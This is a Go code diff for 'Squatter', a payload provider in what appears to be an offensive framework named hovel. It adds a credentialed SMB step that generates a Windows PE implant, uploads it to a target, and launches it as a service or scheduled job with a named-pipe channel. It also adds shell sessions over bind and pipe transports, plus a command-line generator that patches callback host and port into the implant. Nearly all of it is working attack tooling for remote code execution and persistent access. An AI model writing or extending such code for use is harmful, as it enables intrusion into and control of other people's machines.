@@ -5,11 +5,14 @@
 package main
 
 import (
+	"bytes"
+	"context"
 	"crypto/rand"
 	"crypto/sha256"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
+	"flag"
 	"fmt"
 	"io"
 	"net"
@@ -17,9 +20,11 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
+	"time"
 	"unicode/utf16"
 
 	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/shell"
+	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/smbpipe"
 	"github.com/Vibe-Pwners/hovel/sdk/go/hovel"
 )
 
@@ -51,11 +56,12 @@ const (
 
 // Provider implements Hovel's payload_provider contract for Squatter.
 type Provider struct {
-	lp listeningPost
+	lp           listeningPost
+	smbInstaller smbInstaller
 }
 
 func newProvider() Provider {
-	return Provider{lp: newPlaceholderLP()}
+	return Provider{lp: newPlaceholderLP(), smbInstaller: goSMBInstaller{}}
 }
 
 func (p Provider) listeningPost() listeningPost {
@@ -63,6 +69,77 @@ func (p Provider) listeningPost() listeningPost {
 		return newPlaceholderLP()
 	}
 	return p.lp
+}
+
+func (p Provider) installer() smbInstaller {
+	if p.smbInstaller == nil {
+		return goSMBInstaller{}
+	}
+	return p.smbInstaller
+}
+
+type smbInstaller interface {
+	InstallSMB(hovel.StepExecuteRequest, smbInstallOptions) (smbInstallResult, error)
+}
+
+type smbInstallOptions struct {
+	Host        string
+	Port        int
+	Domain      string
+	Username    string
+	Password    string
+	RemotePath  string
+	ServiceName string
+	PipeName    string
+	Payload     []byte
+}
+
+type smbInstallResult struct {
+	RemotePath    string
+	ServiceName   string
+	BinaryPath    string
+	BytesWritten  int
+	ServiceStatus uint32
+	ServiceState  uint32
+	Win32ExitCode uint32
+	QueryError    string
+	LaunchMethod  string
+	ATStatus      uint32
+	ATJobID       uint32
+}
+
+type goSMBInstaller struct{}
+
+func (goSMBInstaller) InstallSMB(_ hovel.StepExecuteRequest, opts smbInstallOptions) (smbInstallResult, error) {
+	result, err := smbpipe.UploadAndStart(context.Background(), smbpipe.InstallOptions{
+		Options: smbpipe.Options{
+			Host:     opts.Host,
+			Port:     opts.Port,
+			Domain:   opts.Domain,
+			Username: opts.Username,
+			Password: opts.Password,
+			Timeout:  defaultSMBTimeout(),
+		},
+		RemotePath:  opts.RemotePath,
+		ServiceName: opts.ServiceName,
+		Payload:     opts.Payload,
+	})
+	if err != nil {
+		return smbInstallResult{}, err
+	}
+	return smbInstallResult{
+		RemotePath:    result.RemotePath,
+		ServiceName:   result.ServiceName,
+		BinaryPath:    result.BinaryPath,
+		BytesWritten:  result.BytesWritten,
+		ServiceStatus: result.ServiceStatus,
+		ServiceState:  result.ServiceState,
+		Win32ExitCode: result.Win32ExitCode,
+		QueryError:    result.QueryError,
+		LaunchMethod:  result.LaunchMethod,
+		ATStatus:      result.ATStatus,
+		ATJobID:       result.ATJobID,
+	}, nil
 }
 
 func (Provider) Info() hovel.Info {
@@ -85,6 +162,10 @@ func (Provider) Schema() hovel.Schema {
 			hovel.Req("payload.lport", "port", "TCP callback listener port."),
 			hovel.Req("payload.bind_port", "port", "TCP bind port opened by the payload on the target."),
 			hovel.Req("payload.pipe", "string", "SMB named pipe for post-throw Squatter comms."),
+			hovel.Req("smb.username", "string", "SMB username for credentialed upload/connect."),
+			hovel.Req("smb.password", "string", "SMB password for credentialed upload/connect."),
+			hovel.Req("smb.domain", "string", "SMB domain or local machine name."),
+			hovel.Req("smb.port", "port", "SMB TCP port."),
 		},
 		Outputs: map[string]any{
 			"payloads": "per-target Squatter payload artifact set",
@@ -131,16 +212,19 @@ func (p Provider) Run(ctx *hovel.Context) (hovel.Result, error) {
 	if transport == tcpBind {
 		if placeholder, ok := lp.(*placeholderLP); ok {
 			if conn, ok := placeholder.tcpBindConn(target); ok {
-				ref, err := ctx.OpenSession(
-					&hovel.PTYSession{Frontend: func(input io.Reader, output io.Writer) error {
-						shell.New(conn).Run(input, output)
-						return nil
-					}},
-					hovel.WithName("Squatter session"),
-					hovel.WithKind("agent"),
-					hovel.WithTransport("squatter/tcp-bind"),
-					hovel.WithCapabilities(capabilities()...),
-				)
+				ref, err := openSquatterSession(ctx, conn, "squatter/tcp-bind")
+				if err != nil {
+					return hovel.Result{}, err
+				}
+				result.Sessions = append(result.Sessions, ref)
+				return result, nil
+			}
+		}
+	}
+	if transport == smbNamedPipe {
+		if placeholder, ok := lp.(*placeholderLP); ok {
+			if conn, ok := placeholder.smbConn(target); ok {
+				ref, err := openSquatterSession(ctx, conn, "squatter/smb-named-pipe")
 				if err != nil {
 					return hovel.Result{}, err
 				}
@@ -151,6 +235,24 @@ func (p Provider) Run(ctx *hovel.Context) (hovel.Result, error) {
 	}
 	result.Sessions = append(result.Sessions, session)
 	return result, nil
+}
+
+func openSquatterSession(ctx *hovel.Context, conn io.ReadWriteCloser, transport string) (hovel.SessionRef, error) {
+	return ctx.OpenSession(
+		&hovel.PTYSession{Frontend: func(input io.Reader, output io.Writer) error {
+			defer conn.Close()
+			inputFile, ok := input.(*os.File)
+			if !ok {
+				return fmt.Errorf("squatter PTY input is %T, want *os.File", input)
+			}
+			shell.New(conn).RunPromptIO(inputFile, output, transport)
+			return nil
+		}},
+		hovel.WithName("Squatter session"),
+		hovel.WithKind("agent"),
+		hovel.WithTransport(transport),
+		hovel.WithCapabilities(capabilities()...),
+	)
 }
 
 func stringConfigFromContext(ctx *hovel.Context) map[string]string {
@@ -185,11 +287,6 @@ func (Provider) DescribeSteps() (hovel.StepContractSet, error) {
 			{
 				ID:   "squatter.install_smb",
 				Kind: "payload.install",
-				Requires: []hovel.CapabilityRequirement{
-					capability(hovel.CapabilityRemoteExecution, nil),
-					capability(hovel.CapabilityCredential, map[string]any{"protocol": "smb"}),
-					capability(hovel.CapabilityPayloadArtifact, map[string]any{"provider": payloadName}),
-				},
 				Produces: []hovel.CapabilityRequirement{
 					capability(hovel.CapabilityPayloadInstance, map[string]any{"provider": payloadName, "transport": smbNamedPipe}),
 					capability(hovel.CapabilityTransport, map[string]any{"kind": "smb-pipe"}),
@@ -203,7 +300,6 @@ func (Provider) DescribeSteps() (hovel.StepContractSet, error) {
 				Requires: []hovel.CapabilityRequirement{
 					capabilityWithStates(hovel.CapabilityPayloadInstance, map[string]any{"provider": payloadName, "transport": smbNamedPipe}, "installed", "disconnected", "installed_unconnected"),
 					capability(hovel.CapabilityTransport, map[string]any{"kind": "smb-pipe"}),
-					capabilityWithStates(hovel.CapabilityCredential, map[string]any{"protocol": "smb"}, "active"),
 				},
 				Produces: []hovel.CapabilityRequirement{
 					capability(hovel.CapabilitySessionRef, map[string]any{"provider": payloadName, "transport": smbNamedPipe}),
@@ -418,6 +514,9 @@ func prepareTCPCallbackInstall(req hovel.StepPrepareRequest) (hovel.StepPrepareR
 
 func preparedInstallNames(req hovel.StepPrepareRequest) (string, string, error) {
 	stagedPath, err := preparedString(req.ExistingPreparedValues, "staged_path", func() (string, error) {
+		if remotePath, ok := stringConfig(req.Config, "payload.remote_path"); ok && remotePath != "" {
+			return remotePath, nil
+		}
 		token, err := randomToken(6)
 		if err != nil {
 			return "", err
@@ -483,6 +582,9 @@ func sanitizeCapabilitySuffix(value string) string {
 
 func prepareSMBInstall(req hovel.StepPrepareRequest) (hovel.StepPrepareResult, error) {
 	stagedPath, err := preparedString(req.ExistingPreparedValues, "staged_path", func() (string, error) {
+		if remotePath, ok := stringConfig(req.Config, "payload.remote_path"); ok && remotePath != "" {
+			return remotePath, nil
+		}
 		token, err := randomToken(6)
 		if err != nil {
 			return "", err
@@ -499,6 +601,9 @@ func prepareSMBInstall(req hovel.StepPrepareRequest) (hovel.StepPrepareResult, e
 		return hovel.StepPrepareResult{}, err
 	}
 	pipeName, err := preparedString(req.ExistingPreparedValues, "pipe_name", func() (string, error) {
+		if pipe, ok := stringConfig(req.Config, "payload.pipe"); ok && pipe != "" {
+			return smbpipe.NormalizePipePath(pipe), nil
+		}
 		return randomToken(6)
 	})
 	if err != nil {
@@ -580,6 +685,8 @@ func randomToken(byteCount int) (string, error) {
 
 func (p Provider) ExecuteStep(req hovel.StepExecuteRequest) (hovel.StepExecuteResult, error) {
 	switch req.StepID {
+	case "squatter.install_smb":
+		return p.executeSMBInstall(req)
 	case "squatter.listen_tcp_callback":
 		return p.executeTCPCallbackListen(req)
 	case "squatter.connect_tcp_bind":
@@ -599,6 +706,152 @@ func (p Provider) ExecuteStep(req hovel.StepExecuteRequest) (hovel.StepExecuteRe
 			Message:      "squatter step execution is not implemented yet",
 		}},
 	}, nil
+}
+
+func (p Provider) executeSMBInstall(req hovel.StepExecuteRequest) (hovel.StepExecuteResult, error) {
+	config := stringMapFromAny(req.RunMetadata["config"])
+	if config == nil {
+		config = map[string]string{}
+	}
+	config["payload.transport"] = smbNamedPipe
+	prepared := stringMapFromAny(req.ConfirmedPreparedValues)
+	target := firstNonEmpty(config["target.host"], config["smb.host"])
+	remotePath := firstNonEmpty(prepared["staged_path"], config["payload.remote_path"])
+	serviceName := firstNonEmpty(prepared["service_name"], config["service.name"])
+	pipeName := firstNonEmpty(prepared["pipe_name"], normalizeNamedPipe(config["payload.pipe"]))
+	if target == "" || remotePath == "" || serviceName == "" || pipeName == "" {
+		return hovel.StepExecuteResult{}, fmt.Errorf("squatter.install_smb missing target, staged_path, service_name, or pipe_name")
+	}
+	config["payload.pipe"] = `\\.\pipe\` + smbpipe.NormalizePipePath(pipeName)
+
+	artifact, err := p.GeneratePayload(hovel.GeneratePayloadRequest{
+		RunID:     req.RunID,
+		Target:    target,
+		PayloadID: "squatter/windows/x86/windows-7/smb-named-pipe/pe-exe",
+		Format:    formatPEEXE,
+		Config:    config,
+	})
+	if err != nil {
+		return hovel.StepExecuteResult{}, err
+	}
+	payload, err := base64.StdEncoding.DecodeString(artifact.Primary.Bytes)
+	if err != nil {
+		return hovel.StepExecuteResult{}, err
+	}
+	installOpts, err := smbInstallOptionsFromConfig(config, target, remotePath, serviceName, pipeName, payload)
+	if err != nil {
+		return hovel.StepExecuteResult{}, err
+	}
+	install, err := p.installer().InstallSMB(req, installOpts)
+	if err != nil {
+		return hovel.StepExecuteResult{
+			Status: "install_failed",
+			Evidence: []hovel.Evidence{{
+				ID:           "ev_squatter_install_smb_failed",
+				Level:        "warning",
+				Kind:         "payload.install.failed",
+				SourceStepID: req.StepID,
+				Message:      "Squatter SMB credentialed install failed",
+				Details:      map[string]any{"error": err.Error(), "target": target},
+			}},
+		}, nil
+	}
+	return hovel.StepExecuteResult{
+		Status: "succeeded",
+		Capabilities: []hovel.Capability{
+			{
+				ID:             "cap_payload_instance_" + sanitizeCapabilitySuffix(serviceName),
+				Type:           hovel.CapabilityPayloadInstance,
+				SchemaVersion:  "v1",
+				State:          "installed",
+				ProducerStepID: req.StepID,
+				Attributes: map[string]any{
+					"provider":       payloadName,
+					"transport":      smbNamedPipe,
+					"staged_path":    install.RemotePath,
+					"service_name":   install.ServiceName,
+					"bytes_written":  install.BytesWritten,
+					"service_status": fmt.Sprintf("0x%08x", install.ServiceStatus),
+					"service_state":  fmt.Sprintf("0x%08x", install.ServiceState),
+					"win32_exit":     fmt.Sprintf("0x%08x", install.Win32ExitCode),
+					"query_error":    install.QueryError,
+					"launch_method":  install.LaunchMethod,
+					"atsvc_status":   fmt.Sprintf("0x%08x", install.ATStatus),
+					"atsvc_job_id":   install.ATJobID,
+				},
+			},
+			{
+				ID:             "cap_endpoint_smb_pipe_" + sanitizeCapabilitySuffix(pipeName),
+				Type:           hovel.CapabilityTransport,
+				SchemaVersion:  "v1",
+				State:          "active",
+				ProducerStepID: req.StepID,
+				Attributes: map[string]any{
+					"kind":      "smb-pipe",
+					"pipe_name": pipeName,
+				},
+			},
+			cleanupCapability(req.StepID, "cap_cleanup_"+sanitizeCapabilitySuffix(serviceName), install.RemotePath, install.ServiceName),
+		},
+		Evidence: []hovel.Evidence{{
+			ID:           "ev_squatter_install_smb",
+			Level:        "info",
+			Kind:         "payload.install",
+			SourceStepID: req.StepID,
+			Message:      "Squatter uploaded and started over SMB with supplied credentials",
+			Details: map[string]any{
+				"target":         target,
+				"remote_path":    install.RemotePath,
+				"service_name":   install.ServiceName,
+				"binary_path":    install.BinaryPath,
+				"bytes_written":  install.BytesWritten,
+				"service_status": fmt.Sprintf("0x%08x", install.ServiceStatus),
+				"service_state":  fmt.Sprintf("0x%08x", install.ServiceState),
+				"win32_exit":     fmt.Sprintf("0x%08x", install.Win32ExitCode),
+				"query_error":    install.QueryError,
+				"launch_method":  install.LaunchMethod,
+				"atsvc_status":   fmt.Sprintf("0x%08x", install.ATStatus),
+				"atsvc_job_id":   install.ATJobID,
+				"pipe_name":      pipeName,
+			},
+		}},
+	}, nil
+}
+
+func smbInstallOptionsFromConfig(config map[string]string, target, remotePath, serviceName, pipeName string, payload []byte) (smbInstallOptions, error) {
+	port := 0
+	if text := config["smb.port"]; text != "" {
+		parsed, err := strconv.Atoi(text)
+		if err != nil {
+			return smbInstallOptions{}, fmt.Errorf("smb.port is not valid: %w", err)
+		}
+		port = parsed
+	}
+	opts := smbInstallOptions{
+		Host:        firstNonEmpty(config["smb.host"], target),
+		Port:        port,
+		Domain:      config["smb.domain"],
+		Username:    config["smb.username"],
+		Password:    config["smb.password"],
+		RemotePath:  remotePath,
+		ServiceName: serviceName,
+		PipeName:    pipeName,
+		Payload:     payload,
+	}
+	if opts.Host == "" {
+		return smbInstallOptions{}, fmt.Errorf("target.host or smb.host is required for Squatter SMB install")
+	}
+	if opts.Username == "" {
+		return smbInstallOptions{}, fmt.Errorf("smb.username is required for Squatter SMB install")
+	}
+	if opts.Password == "" {
+		return smbInstallOptions{}, fmt.Errorf("smb.password is required for Squatter SMB install")
+	}
+	return opts, nil
+}
+
+func defaultSMBTimeout() time.Duration {
+	return 10 * time.Second
 }
 
 func (p Provider) executeTCPCallbackListen(req hovel.StepExecuteRequest) (hovel.StepExecuteResult, error) {
@@ -844,12 +1097,9 @@ func (Provider) GeneratePayload(req hovel.GeneratePayloadRequest) (hovel.Payload
 }
 
 func patchPayloadConfig(body []byte, req hovel.GeneratePayloadRequest) error {
-	offset := strings.Index(string(body), payloadConfigMagic)
-	if offset < 0 {
-		return fmt.Errorf("squatter payload config marker %q not found", payloadConfigMagic)
-	}
-	if len(body) < offset+payloadConfigPipeOffset+(payloadConfigPipeCharacters*2) {
-		return fmt.Errorf("squatter payload config blob is truncated")
+	offset, err := payloadConfigOffset(body)
+	if err != nil {
+		return err
 	}
 
 	transport := req.Config["payload.transport"]
@@ -874,6 +1124,47 @@ func patchPayloadConfig(body []byte, req hovel.GeneratePayloadRequest) error {
 	default:
 		return fmt.Errorf("unsupported squatter transport %q", transport)
 	}
+}
+
+func payloadConfigOffset(body []byte) (int, error) {
+	marker := []byte(payloadConfigMagic)
+	for cursor := 0; cursor < len(body); {
+		found := bytes.Index(body[cursor:], marker)
+		if found < 0 {
+			break
+		}
+		offset := cursor + found
+		if looksLikePayloadConfig(body, offset) {
+			return offset, nil
+		}
+		cursor = offset + 1
+	}
+	return -1, fmt.Errorf("squatter payload config marker %q not found", payloadConfigMagic)
+}
+
+func looksLikePayloadConfig(body []byte, offset int) bool {
+	end := offset + payloadConfigPipeOffset + (payloadConfigPipeCharacters * 2)
+	if len(body) < end {
+		return false
+	}
+	kind := binary.LittleEndian.Uint32(body[offset+payloadConfigKindOffset:])
+	if kind > payloadConfigKindTCPBind {
+		return false
+	}
+	return utf16HasPrefix(body[offset+payloadConfigPipeOffset:end], `\\.\pipe\`)
+}
+
+func utf16HasPrefix(data []byte, prefix string) bool {
+	encoded := utf16.Encode([]rune(prefix))
+	if len(data) < len(encoded)*2 {
+		return false
+	}
+	for index, value := range encoded {
+		if binary.LittleEndian.Uint16(data[index*2:]) != value {
+			return false
+		}
+	}
+	return true
 }
 
 func patchTCPBindConfig(config []byte, req hovel.GeneratePayloadRequest) error {
@@ -1071,5 +1362,54 @@ func capabilities() []string {
 }
 
 func main() {
+	if len(os.Args) > 1 && os.Args[1] == "generate" {
+		os.Exit(runGenerateCommand(os.Args[2:], os.Stdout, os.Stderr))
+	}
 	hovel.Serve(newProvider())
+}
+
+func runGenerateCommand(args []string, stdout, stderr io.Writer) int {
+	flags := flag.NewFlagSet("squatter-provider generate", flag.ContinueOnError)
+	flags.SetOutput(stderr)
+	transport := flags.String("transport", tcpBind, "payload transport: tcp-bind, smb-named-pipe, or tcp-callback")
+	outPath := flags.String("out", "", "path to write the patched PE")
+	pipe := flags.String("pipe", `\\.\pipe\squatter`, "named pipe for smb-named-pipe transport")
+	bindPort := flags.String("bind-port", "9100", "TCP bind port")
+	lhost := flags.String("lhost", "127.0.0.1", "TCP callback host")
+	lport := flags.String("lport", "4444", "TCP callback port")
+	if err := flags.Parse(args); err != nil {
+		return 2
+	}
+	if *outPath == "" {
+		fmt.Fprintln(stderr, "generate requires --out")
+		return 2
+	}
+	config := map[string]string{
+		"payload.transport": canonicalTransport(*transport),
+		"payload.pipe":      *pipe,
+		"payload.bind_port": *bindPort,
+		"payload.lhost":     *lhost,
+		"payload.lport":     *lport,
+	}
+	artifact, err := newProvider().GeneratePayload(hovel.GeneratePayloadRequest{
+		RunID:     "manual-generate",
+		PayloadID: "squatter/windows/x86/windows-7/" + config["payload.transport"] + "/pe-exe",
+		Format:    formatPEEXE,
+		Config:    config,
+	})
+	if err != nil {
+		fmt.Fprintf(stderr, "generate: %v\n", err)
+		return 1
+	}
+	body, err := base64.StdEncoding.DecodeString(artifact.Primary.Bytes)
+	if err != nil {
+		fmt.Fprintf(stderr, "decode generated payload: %v\n", err)
+		return 1
+	}
+	if err := os.WriteFile(*outPath, body, 0600); err != nil {
+		fmt.Fprintf(stderr, "write %s: %v\n", *outPath, err)
+		return 1
+	}
+	fmt.Fprintf(stdout, "wrote %s (%d bytes, transport=%s)\n", *outPath, len(body), config["payload.transport"])
+	return 0
 }
